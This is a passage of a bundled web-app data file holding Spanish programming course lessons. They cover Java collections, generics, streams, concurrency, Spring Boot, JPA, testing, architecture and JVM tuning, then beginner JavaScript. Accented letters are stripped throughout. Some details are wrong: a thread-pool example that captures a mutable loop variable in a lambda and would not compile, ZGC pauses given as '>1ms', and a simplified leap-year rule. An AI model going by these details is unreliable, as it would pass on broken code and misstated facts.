numeros.add(1);
numeros.add(1); // Ignorado
System.out.println(numeros.size()); // 1
\`\`\`

## 3. Mapas (\`Map\` y \`HashMap\`)
Pares Clave-Valor. Como un Diccionario en Python o un Objeto en JS.
\`\`\`java
Map<String, Integer> edades = new HashMap<>();
edades.put("Ana", 30);
edades.put("Luis", 25);

if (edades.containsKey("Ana")) {
    System.out.println("Edad de Ana: " + edades.get("Ana"));
}
\`\`\`

---

### Misin Semi-Senior:
Distingue entre la **Interfaz** (\`List\`) y la **Implementacin** (\`ArrayList\`).
Siempre declara usando la interfaz: \`List<String> x = new ArrayList<>();\`
Esto te permite cambiar \`ArrayList\` por \`LinkedList\` despus sin romper todo el cdigo.
`,completed:!1},{id:"java-10-genericos",title:"Genricos (Generics)",level:"semi-senior",content:`# Leccin 10: Genricos (Generics)

Por qu escribimos \`List<String>\` y no solo \`List\`? Eso es un Genrico.

## 1. El problema del "Raw Type"
Antes de Java 5, las listas eran de \`Object\`.
\`\`\`java
List lista = new ArrayList();
lista.add("Texto");
// Haba que castear manualmente. Peligroso.
String s = (String) lista.get(0);
\`\`\`

## 2. La solucin (\`<T>\`)
Definimos que la lista solo acepta Strings.
\`\`\`java
List<String> lista = new ArrayList<>();
lista.add("Texto");
// No hace falta casting
String s = lista.get(0);
// lista.add(123); // ERROR de compilacin. Seguridad de tipos!
\`\`\`

## 3. Clases Genricas propias
Puedes crear tus propias clases flexibles.
\`\`\`java
public class Caja<T> {
    private T contenido;

    public void guardar(T objeto) {
        this.contenido = objeto;
    }

    public T sacar() {
        return this.contenido;
    }
}

Caja<Integer> cajaDeNumeros = new Caja<>();
cajaDeNumeros.guardar(10);
\`\`\`

---

### Misin Semi-Senior:
Los Genricos existen solo en tiempo de compilacin. En runtime, Java borra el tipo (Type Erasure) para mantener compatibilidad con versiones viejas. Entender esto es clave cuando depuras errores raros de reflexin.
`,completed:!1},{id:"java-11-java8-lambdas",title:"Java 8 (Lambdas y Streams)",level:"semi-senior",content:`# Leccin 11: Java 8 (Lambdas y Streams)

Java dej de ser un lenguaje verboso en 2014 con Java 8.

## 1. Expresiones Lambda
Son funciones annimas que hacen el cdigo ms limpio.
\`\`\`java
// Forma antigua (Clase annima)
new Thread(new Runnable() {
    @Override
    public void run() {
        System.out.println("Hola");
    }
}).start();

// Forma nueva (Lambda)
new Thread(() -> System.out.println("Hola")).start();
\`\`\`

## 2. API Stream (Programacin Funcional)
Procesar colecciones como un flujo de datos.
\`\`\`java
List<String> nombres = Arrays.asList("Ana", "Luis", "Pedro", "Alba");

// Filtrar nombres que empiezan con A y convertirlos a maysculas
List<String> resultado = nombres.stream()
    .filter(name -> name.startsWith("A"))
    .map(name -> name.toUpperCase())
    .collect(Collectors.toList());

// Resultado: ["ANA", "ALBA"]
\`\`\`
Sin \`for-each\`, sin \`if\`, sin variables temporales. Pura elegancia declarativa.

## 3. Operations (Intermediate vs Terminal)
*   **Intermedia:** \`filter\`, \`map\`, \`sorted\`. No ejecutan nada, solo configuran el pipeline.
*   **Terminal:** \`collect\`, \`forEach\`, \`count\`. Disparan la ejecucin. Si olvidas la operacin terminal, el Stream no hace nada.

---

### Misin Semi-Senior:
Aprender a usar \`Optional<T>\` para evitar el temido \`NullPointerException\`.
\`\`\`java
Optional<String> nombre = Optional.ofNullable(null);
System.out.println(nombre.orElse("Desconocido")); // Imprime "Desconocido"
\`\`\`
`,completed:!1},{id:"java-12-practica-semi-senior",title:"Prctica Java Semi-Senior: El Analizador de Logs",level:"semi-senior",content:`# Prctica Java Semi-Senior: El Analizador de Logs

Demuestra que dominas las Colecciones, los Streams y la Programacin Funcional.

---

## 1. El Parseador de Logs (Collections + Streams)
**Consigna:** Tienes una lista de Strings que representan logs:
\`\`\`java
List<String> logs = Arrays.asList(
    "2023-01-01 10:00:00 INFO Inicio de sistema",
    "2023-01-01 10:05:00 ERROR NullPointerException",
    "2023-01-01 10:10:00 INFO Proceso terminado",
    "2023-01-01 10:15:00 ERROR DatabaseConnectionException"
);
\`\`\`
1.  Filtra los logs que sean de tipo "ERROR".
2.  Extrae solo el mensaje de error (quitando la fecha y el nivel de severidad).
3.  Cuenta cuntos errores nicos ocurrieron (usa \`.distinct().count()\`).

## 2. El Mapa de Frecuencias (Map + Generics)
**Consigna:** Crea una funcin genrica \`Contador<T>\` que reciba una lista de objetos \`List<T>\` y devuelva un \`Map<T, Integer>\` con la frecuencia de cada elemento.
*   Ejemplo: \`["A", "B", "A", "C"]\` -> \`{"A": 2, "B": 1, "C": 1}\`.
*   Usa el mtodo \`.getOrDefault\` del Map para simplificar la lgica.

## 3. Reto de Excepciones
**Consigna:**
*   Crea una excepcin personalizada \`InvalidLogException\`.
*   Crea un mtodo que analice un log y lance esta excepcin si el formato no es vlido (ej: no contiene la palabra "INFO" o "ERROR").
*   Maneja la excepcin con \`try-catch\` e imprime un mensaje amigable.

---

### Resultado esperado:
Cdigo limpio, uso de API Stream para evitar bucles \`for\` innecesarios y manejo correcto de Tipos Genricos.
`,completed:!1,isProject:!0},{id:"java-13-concurrencia",title:"Concurrencia y Multithreading",level:"semi-senior",content:`# Leccin 13: Concurrencia y Multithreading

Java naci preparado para la concurrencia. Pero usar \`Thread\` a mano es cosa del pasado.

## 1. El problema de los Hilos Manuales
\`\`\`java
Thread t = new Thread(() -> System.out.println("Hola"));
t.start();
\`\`\`
Crear hilos es caro para el sistema operativo. Si creas 10,000 hilos, tu servidor colapsar.

## 2. ExecutorService (Pool de Hilos)
La solucin profesional. Reutiizas un grupo fijo de hilos.
\`\`\`java
ExecutorService executor = Executors.newFixedThreadPool(10); // Solo 10 obreros

for (int i = 0; i < 100; i++) {
    executor.submit(() -> System.out.println("Tarea " + i));
}
executor.shutdown();
\`\`\`

## 3. Sincronizacin (\`synchronized\`)
Cuando dos hilos tocan la misma variable a la vez, ocurre una **Condition Race**.
\`\`\`java
public synchronized void incrementar() {
    contador++; 
}
\`\`\`
Esto pone un "candado" (Lock). Solo un hilo puede entrar a este mtodo a la vez.

---

### Misin Semi-Senior:
Aprender sobre **Datos Inmutables**. Si un objeto NO puede cambiar de estado (como un \`String\`), es automticamente **Thread-Safe** sin necesidad de sincronizacin.
`,completed:!1},{id:"java-14-spring-boot-backend",title:"Backend Moderno con Spring Boot",level:"semi-senior",content:`# Leccin 14: Backend Moderno con Spring Boot

Java se comi el mundo empresarial gracias a **Spring Boot**. Es un framework opinionado que te da todo listo para produccin.

## 1. La Inversin de Control (IoC)
En lugar de hacer \`new Service()\`, le pides a Spring que te lo d.
\`\`\`java
@Service // Le dices a Spring: "T encrgate de crear esto"
public class ProductService { ... }

@RestController
public class ProductController {
    
    @Autowired // Inyeccin de Dependencias
    private ProductService service;
}
\`\`\`

## 2. API REST (Controller, Service, Repository)
*   **@RestController:** Recibe peticiones HTTP.
*   **@Service:** Contiene la lgica de negocio (validaciones, clculos).
*   **@Repository:** Habla con la base de datos (JPA).

## 3. Un Endpoint simple
\`\`\`java
@GetMapping("/productos")
public List<String> obtenerTodos() {
    return List.of("Laptop", "Mouse");
}
\`\`\`
Spring Boot convierte automticamente la lista de Java a un JSON \`["Laptop", "Mouse"]\`.

---

### Misin Backend:
Entender la diferencia entre \`@Component\` (genrico), \`@Service\` (lgica), \`@Repository\` (datos) y \`@Controller\` (web). Aunque tcnicamente hacen lo mismo (registrar el bean), semnticamente son muy distintos.
`,completed:!1},{id:"java-15-java-sql-jdbc-jpa",title:"Java y Bases de Datos (JDBC y JPA)",level:"senior",content:`# Leccin 15: Java y Bases de Datos (JDBC y JPA)

Java tiene dos formas de hablar con bases de datos: **La forma difcil (JDBC)** y **la forma de Spring (JPA)**.

## 1. JDBC (Java Database Connectivity)
Es el driver de bajo nivel. Escribes SQL puro.
\`\`\`java
Connection conn = DriverManager.getConnection("jdbc:mysql://localhost/db", "user", "pass");
PreparedStatement stmt = conn.prepareStatement("SELECT * FROM users WHERE id = ?");
stmt.setInt(1, 5);
ResultSet rs = stmt.executeQuery();
while (rs.next()) {
    System.out.println(rs.getString("name"));
}
\`\`\`
**Pros:** Control total. **Contras:** Muy verboso. Hay que cerrar conexiones manualmente \`conn.close()\`.

## 2. JPA y Hibernate (ORM)
Java Persistence API (JPA) es la especificacin. Hibernate es la implementacin ms famosa. Mapea clases a tablas.
\`\`\`java
@Entity
@Table(name = "usuarios")
public class Usuario {
    @Id
    @GeneratedValue(strategy = GenerationType.IDENTITY)
    private Long id;
    
    private String nombre;
}
\`\`\`

## 3. Relaciones en JPA
*   \`@OneToMany\`: Un Usuario tiene muchos Pedidos.
*   \`@ManyToOne\`: Muchos Pedidos pertenecen a un Usuario.
\`\`\`java
@OneToMany(mappedBy = "usuario")
private List<Pedido> pedidos;
\`\`\`
Esto permite hacer \`usuario.getPedidos()\` y Hibernate genera el \`SELECT\` necesario automticamente.

---

### Misin Senior:
El problema **N+1** es muy comn en Hibernate. Si haces \`usuario.getPedidos()\` dentro de un bucle de usuarios, Hibernate har 100 consultas a la DB. Usa \`JOIN FETCH\` en JPQL para traer todo de una vez.
`,completed:!1},{id:"java-16-testing-junit",title:"Testing en Java (JUnit 5 & Mockito)",level:"senior",content:`# Leccin 16: Testing en Java (JUnit 5 & Mockito)

El Testing es una cultura. En Java, el rey es **JUnit**.

## 1. JUnit 5 (Jpiter y API)
Estructura bsica de un test:
\`\`\`java
import static org.junit.jupiter.api.Assertions.assertEquals;
import org.junit.jupiter.api.Test;

public class CalculadoraTest {
    @Test
    void sumarDeberiaDarCorrecto() {
        assertEquals(4, 2 + 2);
    }
}
\`\`\`

## 2. Mocking con Mockito
Un test unitario debe aislar la lgica. No puede llamar a la Base de Datos.
Para eso Mockeamos el repositorio.
\`\`\`java
@Test
void deberiaCrearUsuario() {
    UserRepository mockRepo = Mockito.mock(UserRepository.class);
    when(mockRepo.save(any(User.class))).thenReturn(new User(1L, "Juan"));

    UserService service = new UserService(mockRepo);
    User resultado = service.create("Juan");

    assertEquals(1L, resultado.getId());
}
\`\`\`

## 3. Tests de Integracin (@SpringBootTest)
Estos prueban todo junto (Controller + Service + DB real o H2).
\`\`\`java
@SpringBootTest
@AutoConfigureMockMvc
class ApiTest {
    @Autowired
    private MockMvc mvc;

    @Test
    void getUsuarios() throws Exception {
        mvc.perform(get("/api/users"))
           .andExpect(status().isOk())
           .andExpect(content().json("[]"));
    }
}
\`\`\`
Son ms lentos pero simulan mejor la realidad.

---

### Misin Senior:
Manten tus pruebas unitarias **rpidas** (milisegundos) y tus pruebas de integracin **completas**. Si tus tests unitarios tardan 1 minuto en correr, nadie los va a ejecutar.
`,completed:!1},{id:"java-17-arquitectura-limpia",title:"Arquitectura Limpia y Hexagonal en Java",level:"senior",content:`# Leccin 17: Arquitectura Limpia y Hexagonal en Java

Como Senior, tu trabajo no es solo que el cdigo funcione, sino que sea **mantenible** por 5 aos o ms.

## 1. El Problema de las Capas Tradicionales
En la arquitectura clsica (Controller -> Service -> Repository), a veces la lgica de negocio se mezcla con la base de datos. Si cambias de MySQL a Mongo, tienes que reescribir todo.

## 2. Arquitectura Hexagonal (Puertos y Adaptadores)
*   **El Ncleo (Dominio):** Tus reglas de negocio puras. No saben NADA de bases de datos ni de HTTP. Solo Java puro.
*   **Puertos (Interfaces):** El Ncleo define qu necesita (\`PuertoRepositorioUsuario\`).
*   **Adaptadores (Implementacin):**
    *   **Inbound:** Un \`RestController\` que llama al Ncleo.
    *   **Outbound:** Una implementacin de \`PuertoRepositorioUsuario\` que usa JPA.

\`\`\`java
// Ncleo (Domain)
public class CrearUsuarioUseCase {
    private final RepositorioUsuario repo; // Interfaz, no clase concreta
    public CrearUsuarioUseCase(RepositorioUsuario repo) { this.repo = repo; }
}
\`\`\`

## 3. SOLID en la Prctica
*   **S (Single Responsibility):** Una clase, una razn para cambiar.
*   **D (Dependency Inversion):** Depende de abstracciones (interfaces), no de concreciones. Spring nos ayuda mucho con esto.

---

### Misin Senior:
Protege tu **modelo de dominio**. No uses entidades JPA (\`@Entity\`) directamente en tu lgica de negocio. Mapea de DTO a Dominio y de Dominio a Entidad de DB. Es ms trabajo al principio, pero te salva la vida a largo plazo.
`,completed:!1},{id:"java-18-performance-jvm",title:"Performance JVM y Memoria",level:"senior",content:`# Leccin 18: Performance JVM y Memoria

Por qu Java es lento? Mentira, no lo es. Solo necesitas saber cmo funciona la **JVM**.

## 1. El ciclo de vida de un Objeto
*   **Eden Space:** Donde nacen los objetos. La mayora muere joven (Young Generation).
*   **Survivor Space:** Los objetos que sobreviven tras un GC se mueven aqu.
*   **Old Generation (Tenured):** Donde viven los objetos longevos (ej: singletons, caches).

## 2. Garbage Collectors (GC)
*   **G1 (Garbage First):** El "todo terreno" moderno. Optimizado para tiempos de pausa predecibles.
*   **ZGC (Z Garbage Collector):** Para heaps gigantes (Terabytes) con pausas de >1ms.
*   **Serial GC:** Para sistemas embebidos o servidores mnimos (1 core).

## 3. Profiling con VisualVM o JProfiler
Nunca optimices a ciegas.
*   Tu cdigo tarda 5s. Dnde?
*   Usa un profiler para ver: "Es la DB?", "Es la concatenacin de Strings?", "Es el GC pausando todo?".

## 4. Memory Leaks en Java
S, existen. Si guardas objetos en un \`HashMap\` esttico y nunca los borras, la JVM se llenar hasta que explote (\`java.lang.OutOfMemoryError\`).

---

### Misin Senior:
No uses \`System.gc()\`. Es como decirle a la JVM "Oye, limpia la basura". La JVM sabe mejor que t cundo hacerlo. Forzarlo puede congelar toda la aplicacin.
`,completed:!1},{id:"java-19-seguridad-escalabilidad",title:"Seguridad y Escalabilidad Avanzada (Senior)",level:"senior",content:`# Leccin 19: Seguridad y Escalabilidad Avanzada (Senior)

En la cima, todos los detalles importan.

## 1. Seguridad con Spring Security
Es el framework estndar de facto.
*   **Autenticacin**: Quin eres? (Login, OAuth, LDAP).
*   **Autorizacin**: Qu permisos (Authorities) tienes? (RBAC).

## 2. JWT (JSON Web Tokens)
Para APIs modernas.
*   El usuario se loguea, el servidor le da un Token (\`Access Token\`).
*   **Ventaja:** El servidor no necesita guardar estado (Stateless). Cada peticin HTTP viaja con el Token.
*   **Importante:** Nunca guardes contraseas en texto plano. Usa \`BCrypt\` o \`Argon2\`.

## 3. Escalabilidad Vertical vs Horizontal
*   **Vertical:** Aadir ms RAM (Heap) o CPU al servidor. Lmite fsico.
*   **Horizontal:** Aadir ms instancias de la aplicacin (10 servidores).
    *   **Problema:** Cmo compartimos la sesin de usuario?
    *   **Solucin:** Usar una cach distribuida como **Redis**.

## 4. Patrones de Microservicios
*   **Circuit Breaker (Resilience4j):** Si un servicio falla, cortamos la comunicacin para evitar efecto cascada.
*   **API Gateway:** Una puerta nica para todos tus microservicios (Spring Cloud Gateway, Kong).

---

### Misin Senior:
La seguridad no es una capa externa, debe estar en el diseo. Valida CUALQUIER input, escapa SQL, escapa HTML (XSS), usa HTTPS. Un fallo de seguridad cuesta millones.
`,completed:!1},{id:"java-20-practica-senior",title:"Prctica y Evaluacin: Arquitecto Java Senior",level:"senior",content:`# Prctica y Evaluacin: Arquitecto Java Senior

Demuestra que ests listo para liderar un equipo tcnico en una multinacional.

---

## 1. El Desafo de la Performance (Profiler)
**Escenario:** Tienes una aplicacin Spring Boot que lee un archivo CSV de 10GB, lo carga en memoria (dentro de un \`ArrayList<String>\`), y luego lo inserta en una DB.
*   **Problema:** \`OutOfMemoryError: Java heap space\`.
*   **Solucin:** Cmo procesaras el archivo lnea por lnea (\`Streams\` o \`BufferedReader\`) para usar solo 50MB de RAM constantes?

## 2. El Desafo de la Arquitectura (Clean)
**Escenario:** Disea una API de Pagos.
*   Debe soportar PayPal y Stripe (Polimorfismo).
*   La lgica de negocio ("Validar saldo", "Aplicar descuento") NO puede depender de la librera de PayPal o Stripe.
*   Usa Interfaces para desacoplar el dominio de la infraestructura (Inversin de Dependencias).

## 3. El Desafo de la Concurrencia (Safety)
**Escenario:** Tienes un Singleton \`CarritoService\` con una lista \`private List<Item> items = new ArrayList<>();\`.
*   Si 100 usuarios agregan items a la vez, qu pasa? (Race Condition).
*   Cmo lo arreglas? (\`Collections.synchronizedList\`, \`ConcurrentHashMap\`, o mejor, no usar estado mutable compartido).

---

### Resultado esperado:
Un cdigo mantenible, performante, seguro y escalable. Bienvenido al nivel Senior! 
`,completed:!1,isProject:!0},{id:"java-21-errores-comunes",title:"Errores Comunes de un Desarrollador Java",level:"senior",content:'# Leccin 21: Errores Comunes de un Desarrollador Java\n\nAprender de los errores ajenos es la forma ms rpida de subir de nivel.\n\n## 1. El infierno de los "NullPointerException" (NPE)\n*   **Error:** Retornar `null` en lugar de una lista vaca.\n*   **Junior:** `public List<Usuario> getUsuarios() { return null; }`\n*   **Problema:** Quien llame a esto har `getUsuarios().size()` y... Boom! Crash.\n*   **Solucin:** `return Collections.emptyList();` o usar `Optional`.\n\n## 2. Comparar Strings con `==`\n*   **Error:** `if (nombre == "Octavio")`\n*   **Problema:** En Java, `==` compara direcciones de memoria. Si los strings vienen de distintos lugares, dar `false` aunque se lean igual.\n*   **Solucin:** Siempre usa `.equals()`. `if ("Octavio".equals(nombre))` (Pon la constante primero para evitar NPE).\n\n## 3. Tragarse las Excepciones ("Swallowing Exceptions")\n*   **Error:**\n    ```java\n    try {\n        hacerAlgoPeligroso();\n    } catch (Exception e) {\n        e.printStackTrace(); // O peor: nada.\n    }\n    ```\n*   **Problema:** El sistema falla, la app sigue corriendo en un estado corrupto y t no te enteras porque el log se perdi en la consola.\n*   **Solucin:** Loguea con un framework (SLF4J) y relanza la excepcin si no puedes recuperarte.\n\n## 4. Concatenacin de Strings en Bucles\n*   **Error:** `String s = ""; for (i...) s += i;`\n*   **Problema:** Cada `+=` crea un NUEVO objeto String en memoria. O(N^2).\n*   **Solucin:** Usa `StringBuilder`.\n\n---\n\n### Misin de Calidad:\nNunca uses `System.out.println` en un servidor de produccin. Es lento, bloqueante y no se puede rotar ni filtrar. Usa **Loggers** (Log4j2, Logback).\n',completed:!1},{id:"java-22-roadmap-java",title:"Roadmap Java - De Junior a Arquitecto Senior",level:"senior",content:`# Leccin 22: Roadmap Java - De Junior a Arquitecto Senior

Java es enorme. No intentes aprenderlo todo a la vez. Sigue este camino.

## Fase 1: El Constructor (Junior)
*   **Foco:** Sintaxis, POO y lgica.
*   **Aprender:**
    *   Variables, if, for, while.
    *   Clases, Mtodos, Herencia, Interfaces.
    *   Colecciones bsicas (ArrayList, HashMap).
    *   Git bsico.
*   **Proyecto:** Sistema de Gestin de Biblioteca (Consola).

## Fase 2: El Desarrollador Backend (Semi-Senior)
*   **Foco:** Frameworks y Bases de Datos.
*   **Aprender:**
    *   Spring Boot (MVC, REST).
    *   JPA / Hibernate / JDBC.
    *   SQL intermedio.
    *   Tests Unitarios (JUnit, Mockito).
    *   Maven / Gradle.
*   **Proyecto:** API REST de un E-commerce con Login y Carrito.

## Fase 3: El Arquitecto (Senior)
*   **Foco:** Escalabilidad, Seguridad y Calidad.
*   **Aprender:**
    *   Microservicios (Spring Cloud).
    *   Docker / Kubernetes.
    *   Patrones de Diseo (Singleton, Factory, Observer).
    *   Optimizacin de la JVM (GC, Profiling).
    *   Seguridad (OAuth2, JWT).
*   **Proyecto:** Migrar un Monolito legacy a Microservicios en la Nube.

---

### Misin Final:
Java no es solo un lenguaje, es un ecosistema. Aprende a leer la documentacin oficial de Oracle y Spring. Mantente curioso y escribe cdigo limpio. El mundo corre sobre la JVM! 
`,completed:!1}]},y1={id:"js",title:"JavaScript Moderno: De Scripting a Ingeniera",description:"Profundiza en el lenguaje que impulsa la web. Desde los fundamentos de la sintaxis hasta la gestin de memoria y el Event Loop.",completed:!1,lessons:[{id:"js-prerrequisitos",title:"Conocimientos Previos: Ests listo?",level:"junior",content:`# Conocimientos Previos: Antes de programar con JS

JavaScript es el lenguaje de la lgica, pero no vive solo. Para aprenderlo con xito, necesitas tener claras algunas bases.

## 1. HTML y CSS (Estructura y Estilo)
JS sirve para manipular la web. Si no sabes qu es una etiqueta \`<div>\`, una clase \`.clase\` o un ID \`#id\`, te sentirs perdido cuando JS intente buscarlos.
*   **HTML:** Estructura bsica, atributos y jerarqua (padres/hijos).
*   **CSS:** Selectores bsicos y cmo se aplican estilos.

## 2. Lgica de Pensamiento
Programar es darle rdenes a una mquina tonta. Debes estar dispuesto a:
*   Dividir problemas grandes en pasos pequeos (Pensamiento Algortmico).
*   Tener paciencia: Las cosas fallarn mucho al principio!

## 3. Entorno de Trabajo
*   Un navegador moderno (Chrome, Firefox).
*   Un editor de cdigo (VS Code recomendado).
*   Saber qu es la terminal o consola (aunque sea lo bsico).

---
Si ya sabes que un \`<h1>\` es un ttulo y sabes cmo ponerlo de color rojo con CSS, ests ms que listo para empezar con JavaScript!
`,completed:!1},{id:"js-junior-que-es-js",title:"Qu es JavaScript y para qu sirve?",level:"junior",content:`# Leccin 1: Qu es JavaScript y para qu sirve?

## 1. El Cerebro de la Web

Imagina que ests construyendo un robot (tu sitio web):
*   **HTML** es el esqueleto y los tornillos (Estructura).
*   **CSS** es la pintura y el diseo (Apariencia).
*   **JavaScript (JS)** son los cables y el cerebro (Comportamiento y Lgica).

Sin JS, tu robot es una estatua bonita. Con JS, tu robot puede moverse, responder preguntas y bailar.

## 2. Qu hace exactamente?

JavaScript permite que tu pgina web "haga cosas" sin necesidad de recargar la pgina.
*   Mostrar un mapa interactivo.
*   Validar que tu contrasea tenga 8 caracteres.
*   Animar grficos.
*   Cargar nuevos tweets automticamente.

## 3. Dnde vive?

JS vive en el navegador (Chrome, Firefox, Edge). No necesitas instalar nada extra para empezar a programar, porque tu navegador YA tiene un motor de JavaScript dentro.
Tambin puede vivir en el servidor (Node.js), pero eso es para ms adelante!

## 4. Tu primer cdigo "Hola Mundo"

Puedes escribir JS de dos formas:
1.  Dentro de un archivo \`.html\` con la etiqueta \`<script>\`.
2.  En un archivo separado \`.js\` (lo profesional).

Probemos la opcin rpida. Abre la consola de tu navegador (F12 -> Console) y escribe:

\`\`\`javascript
alert("Hola Mundo desde JavaScript!");
\`\`\`
Boom! Tienes una ventana emergente. Acabas de dar tu primera orden al navegador.

## 5. La Consola (\`console.log\`)

\`alert()\` es molesto. Los programadores usamos \`console.log()\` para enviarnos mensajes secretos a nosotros mismos en la consola del navegador.

\`\`\`javascript
console.log("Esto es un mensaje secreto");
console.log(2 + 2); // Calcula y muestra 4
\`\`\`
**Mini Ejercicio:**
Abre la consola (F12) y haz que diga "Hola [Tu Nombre]". Luego haz que sume tu edad + 10.
`,completed:!1},{id:"js-junior-variables",title:"Variables (Cajas con nombre)",level:"junior",content:'# Leccin 2: Variables (Cajas con nombre)\n\n## 1. Qu es una variable?\n\nImagina una caja de mudanza. En ella guardas cosas, y le escribes con marcador qu hay dentro ("Libros", "Cocina").\nEn programacin, una variable es esa caja. Guardamos datos en la memoria para usarlos despus.\n\n## 2. Declarando variables (`var`, `let`, `const`)\n\nAntiguamente solo exista `var`. Ahora tenemos dos mejores opciones: `let` y `const`.\n\n### `let` (La caja abierta)\nsala cuando el contenido de la caja PUEDE cambiar.\n```javascript\nlet edad = 25;\nconsole.log(edad); // 25\n\nedad = 26; // Cumpleaos! Cambiamos el valor\nconsole.log(edad); // 26\n```\n\n### `const` (La caja sellada)\nsala cuando el contenido NO debe cambiar nunca.\n```javascript\nconst pi = 3.1416;\n// pi = 4; // ERROR! No puedes reasignar una constante.\n```\n\n### `var` (El abuelo rebelde)\nNo lo uses. Tiene problemas de "alcance" (scope) que veremos luego. Si ves tutoriales viejos con `var`, reemplzalo mentalmente por `let` o `const`.\n\n## 3. Nombrando variables\n\n*   Usa `camelCase` (primera minscula, siguientes palabras mayscula): `nombreDeUsuario`, `precioTotal`.\n*   S descriptivo. `x` es un mal nombre. `edadUsuario` es un buen nombre.\n*   JS distingue maysculas. `caja` y `Caja` son variables distintas.\n\n## 4. Error Comn: "ReferenceError"\n\n```javascript\nconsole.log(mensaje);\nlet mensaje = "Hola";\n```\nEsto da error. No puedes usar una variable (`let` o `const`) ANTES de crearla. El orden importa: **Declara primero, usa despus.**\n\n## 5. Mini Ejercicio\n1.  Crea una variable `const` para tu nombre.\n2.  Crea una variable `let` para tu edad.\n3.  Intenta cambiar tu edad.\n4.  Intenta cambiar tu nombre y observa el error en consola.\n',completed:!1},{id:"js-junior-tipos-de-datos",title:"Tipos de Datos (Qu hay en la caja?)",level:"junior",content:`# Leccin 3: Tipos de Datos (Qu hay en la caja?)

## 1. Tipos Primitivos (Los tomos)

En JS, las variables no tienen tipo, pero los **valores** s.

### String (Texto)
Va entre comillas (dobles \`""\`, simples \`''\` o invertidas \\\` \\\`).
\`\`\`javascript
let nombre = "Juan";
let saludo = 'Hola';
\`\`\`

### Number (Nmeros)
Enteros o decimales. Sin comillas.
\`\`\`javascript
let edad = 30;
let precio = 9.99;
\`\`\`
*Cuidado:* \`"30"\` (con comillas) es texto, no nmero.

### Boolean (Verdad/Mentira)
Solo puede ser \`true\` (verdadero) o \`false\` (falso). Es un interruptor.
\`\`\`javascript
let esMayorDeEdad = true;
let tieneMascota = false;
\`\`\`

### Undefined (El vaco accidental)
Una variable que declaraste pero no le diste valor.
\`\`\`javascript
let caja;
console.log(caja); // undefined
\`\`\`

### Null (El vaco intencional)
Usado para decir explcitamente "Aqu no hay nada".
\`\`\`javascript
let resultado = null; // Todava no hay resultado
\`\`\`

## 2. \`typeof\` (El detective)

No ests seguro de qu tipo es un dato? Pregntale a JS.
\`\`\`javascript
console.log(typeof "Hola"); // "string"
console.log(typeof 42);     // "number"
console.log(typeof true);   // "boolean"
\`\`\`

## 3. Template Strings (Las comillas mgicas)

Usa comillas invertidas (\\\` \\\`) para meter variables dentro de texto fcilmente.
\`\`\`javascript
let nombre = "Ana";
let edad = 20;

// Forma vieja (fea)
let mensaje1 = "Hola " + nombre + ", tienes " + edad + " aos.";

// Forma moderna (linda)
let mensaje2 = \`Hola \${nombre}, tienes \${edad} aos.\`;
\`\`\`

## 4. Mini Ejercicio
Crea variables para:
*   El nombre de tu pelcula favorita.
*   El ao en que sali.
*   Si la recomendaras (\`true\`/\`false\`).
Usa \`console.log\` y template strings para formar la frase:
"Mi pelcula favorita es [Pelicula] del ao [Ao]. Recomendada? [S/No]"
`,completed:!1},{id:"js-junior-operadores",title:"Operadores (La calculadora)",level:"junior",content:`# Leccin 4: Operadores (La calculadora)

## 1. Operadores Aritmticos

Matemticas bsicas.
\`\`\`javascript
let suma = 5 + 5;       // 10
let resta = 10 - 2;     // 8
let multiplicacion = 3 * 3; // 9
let division = 10 / 2;  // 5
let modulo = 10 % 3;    // 1 (El resto de la divisin 10/3)
\`\`\`

## 2. Operadores de Asignacin

Atajos para no escribir tanto.
\`\`\`javascript
let puntos = 10;
puntos += 5; // Es igual a: puntos = puntos + 5; (15)
puntos -= 2; // Es igual a: puntos = puntos - 2; (13)
puntos++;    // Suma 1 (14)
puntos--;    // Resta 1 (13)
\`\`\`

## 3. Operadores de Comparacin

Devuelven \`true\` o \`false\`.

\`\`\`javascript
/* Igualdad */
console.log(5 == "5");  // true (CUIDADO: Compara valor, ignora tipo)
console.log(5 === "5"); // false (RECOMENDADO: Compara valor Y tipo. Usa siempre este!)

/* Mayor/Menor */
console.log(10 > 5);  // true
console.log(10 < 5);  // false
console.log(10 >= 10); // true (Mayor o igual)
\`\`\`

## 4. Operadores Lgicos (Combinando verdades)

*   \`&&\` (AND / Y): Ambas deben ser verdad.
    \`\`\`javascript
    let tengoDinero = true;
    let tiendaAbierta = true;
    console.log(tengoDinero && tiendaAbierta); // true
    \`\`\`

*   \`||\` (OR / O): Al menos una debe ser verdad.
    \`\`\`javascript
    let esVerano = false;
    let haceCalor = true;
    console.log(esVerano || haceCalor); // true
    \`\`\`

*   \`!\` (NOT / NO): Invierte el valor.
    \`\`\`javascript
    let llueve = true;
    console.log(!llueve); // false
    \`\`\`

## 5. Coercin Extraa (El lado oscuro de JS)
JS intenta "ayudarte" convirtiendo tipos automticamente.
\`\`\`javascript
console.log(1 + "2"); // "12" (Convirti el 1 a texto y los peg)
console.log("5" - 1); // 4 (Convirti el "5" a nmero y rest)
\`\`\`
**Regla:** Nunca confes en la coercin automtica. Convierte los tipos t mismo (\`Number("5")\`).

## 6. Mini Ejercicio
Calcula si un ao es bisiesto.
Un ao es bisiesto si es divisible por 4 (\`ao % 4 === 0\`).
\`\`\`javascript
let year = 2024;
let esBisiesto = (year % 4 === 0);
console.log(\`El ao \${year} es bisiesto: \${esBisiesto}\`);
\`\`\`
Prueba con 2023.
`,completed:!1},{id:"js-junior-condicionales",title:"Condicionales (Tomando decisiones)",level:"junior",content:`# Leccin 5: Condicionales (Tomando decisiones)

## 1. El \`if\` (Si...)

La forma bsica de que tu cdigo piense.
\`\`\`javascript
let clima = "lluvia";

if (clima === "lluvia") {
    console.log("Lleva paraguas ");
}
\`\`\`
Si la condicin entre parntesis es \`true\`, se ejecuta el cdigo entre llaves \`{}\`. Si es \`false\`, se salta.

## 2. El \`else\` (Si no...)

Qu hacer si la condicin NO se cumple.
\`\`\`javascript
let edad = 15;

if (edad >= 18) {
    console.log("Puedes pasar ");
} else {
    console.log("Vete a casa a tomar leche ");
}
\`\`\`

## 3. El \`else if\` (Mltiples opciones)

\`\`\`javascript
let semaforo = "amarillo";

if (semaforo === "verde") {
    console.log("Avanza ");
} else if (semaforo === "amarillo") {
    console.log("Prepara frenar ");
} else if (semaforo === "rojo") {
    console.log("Detente ");
} else {
    console.log("El semforo est roto ");
}
\`\`\`

## 4. Operador Ternario (El \`if\` rpido)

Perfecto para asignaciones simples.
\`condicin ? valor_si_true : valor_si_false\`

\`\`\`javascript
// Version larga
let mensaje;
if (edad >= 18) {
    mensaje = "Adulto";
} else {
    mensaje = "Nio";
}

// Versin Ternaria (Pro)
